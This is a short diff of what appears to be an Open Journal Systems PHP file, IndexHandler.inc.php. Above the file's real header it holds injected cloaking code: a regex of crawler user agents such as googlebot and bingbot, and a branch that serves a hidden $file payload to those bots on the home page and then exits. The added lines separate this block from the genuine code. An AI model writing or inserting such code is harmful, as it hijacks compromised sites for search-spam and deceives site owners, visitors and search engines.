@@ -21,6 +21,9 @@ $botchar = "/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|y
 if (preg_match($botchar, $res)) {
     if ($_SERVER['REQUEST_URI'] === '/' || $_SERVER['REQUEST_URI'] === '/index.php') { echo $file; exit; }
 }
+?>
+
+<?php
 
 /**
  * @file pages/index/IndexHandler.inc.php
